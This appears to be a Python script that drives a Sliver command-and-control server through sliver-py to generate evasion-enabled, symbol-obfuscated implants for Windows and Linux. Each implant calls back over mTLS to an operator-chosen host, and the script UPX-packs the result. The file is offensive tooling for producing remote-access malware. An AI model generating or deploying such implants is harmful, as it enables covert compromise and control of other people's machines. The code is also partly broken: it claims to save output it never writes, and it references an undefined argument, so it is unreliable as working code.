#!/usr/bin/env python3

#python3 -m pip install sliver-py
# https://sliverpy.readthedocs.io/en/latest/install.html

# new-operator --name zer0cool --lhost localhost --save ./zer0cool.cfg

# ./sliver-server operator --name zer0cool --lhost localhost --save ./zer0cool.cfg

# ./sliver-server daemon

import os
import grpc
import asyncio
from halo import Halo
import argparse
from enum import Enum
from sliver import SliverClientConfig, SliverClient, client_pb2


CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".sliver-client", "configs")
CONFIG_PATH = os.path.join(CONFIG_DIR, "default.cfg")

def error(string):
    print(f'[] Error: {string}')
    exit(-1)


async def main(args):

    ''' Client connect example '''
    config = SliverClientConfig.parse_config_file(CONFIG_PATH)
    client = SliverClient(config)
    await client.connect()

    if args.name:
        name = args.name
    else:
        #todo: generate radom name
        name = "testimplant"

    evasion = True
    ObfuscateSymbols = True


    if args.format.lower() == 'elf':
        os_pb = 'linux'
        format_pb = client_pb2.OutputFormat.EXECUTABLE
    elif args.format.lower() == 'so':
        os_pb = 'linux'
        format_pb = client_pb2.OutputFormat.SHARED_LIB
    elif args.format.lower() == 'exe':
        os_pb = 'windows'
        format_pb = client_pb2.OutputFormat.EXECUTABLE
    elif args.format.lower() == 'dll': 
        os_pb = 'windows'
        format_pb = client_pb2.OutputFormat.SHARED_LIB
    else:
        error(f"unsupported format {args.os}")

    if args.output:
        output_filename = args.output

    c2url = f"mtls://{args.lhost}:{args.port}"
    arch = "amd64"
    ImplantC2 = client_pb2.ImplantC2(URL=c2url)
    config = client_pb2.ImplantConfig(Name=name, C2=[ImplantC2], Evasion=evasion, ObfuscateSymbols=ObfuscateSymbols, Format=format_pb, GOOS=os_pb, GOARCH=arch)

    print("============== Config ==================")
    print(f"   Name: {name:10s}      OS: {os_pb:7s}    ")
    print(f"   Format: {args.format.upper():6s}         Arch: {arch:7s}    ")
    print(f"\n        C2: {c2url:30s}")
    print("========================================")

    spinner = Halo(text='Generating', spinner='dots', text_color='green')
    spinner.start()
    try:

        output = await client.generate(config)
        print(output.__dict__)
    except grpc.aio._call.AioRpcError as e:
        error(e.details)
    except Exception as e:
        raise e
    spinner.stop()

    print("implant generated")
    print(f"saved to {output_filename}")

    if args.upx == True:
        print("compressing")
        try:
            os.system(f'upx -9 {output_filename}')
        except Exception as e:
            raise e

if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--format',choices=["exe", "elf", "dll", "so"], required=True, help='format to generate')
    parser.add_argument('-o', '--output', required=True , help='file to write to')

    parser.add_argument('-n', '--name', help='implant name')


    parser.add_argument('-m', '--method', choices=["mtls", "https", "dll", "so"], default='mtls', help='C2 method')

    parser.add_argument('-l', '--lhost', required=True, help='C2 ip / hostname')
    parser.add_argument('-p', '--port', required=True, help='C2 port')

    parser.add_argument('-u', '--upx', action='store_true', default=True, help='UPX compress')

    args = parser.parse_args()


    loop = asyncio.get_event_loop()
    loop.run_until_complete(main(args))

# todo: stagers avec msfvenom


# https://sliverpy.readthedocs.io/en/latest/protobuf/client_pb2.html#sliver.pb.clientpb.client_pb2.ImplantConfig
# https://github.com/BishopFox/sliver/blob/master/protobuf/clientpb/client.proto